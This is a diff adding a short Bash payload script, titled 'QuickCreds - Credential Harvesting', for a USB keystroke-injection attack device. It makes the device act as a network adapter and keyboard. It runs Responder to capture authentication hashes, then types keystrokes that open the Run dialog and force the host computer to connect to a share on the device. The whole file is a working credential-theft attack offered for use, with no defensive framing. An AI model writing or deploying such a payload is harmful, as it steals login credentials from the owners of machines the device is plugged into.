@@ -1,0 +1,21 @@
+#!/bin/bash
+# QuickCreds - Credential Harvesting
+# Author: bad-antics
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+LED ATTACK
+cd /tools/responder
+python Responder.py -I usb0 -wrf &
+
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING \\\\$(cat /sys/class/net/usb0/address | tr -d ':')\\share
+QUACK ENTER
+
+LED FINISH
+sleep 30
+kill $!
+sync
